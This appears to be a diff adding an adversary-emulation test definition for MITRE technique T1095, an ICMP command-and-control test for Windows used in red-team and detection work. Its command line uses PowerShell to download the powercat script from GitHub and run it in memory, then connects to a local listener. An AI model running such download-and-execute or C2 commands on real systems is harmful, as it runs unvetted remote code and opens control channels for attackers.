@@ -1,0 +1,15 @@
+attack_technique: T1095
+display_name: Non-Application Layer Protocol
+atomic_tests:
+- name: ICMP C2
+  auto_generated_guid: 0268e63c-e244-42db-bef7-72a9e59fc1fc
+  description: |
+    This will attempt to start a C2 session using ICMP. For information on how to set up the listener,
+    refer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
+      powercat -c 127.0.0.1 -p 80
+    name: powershell
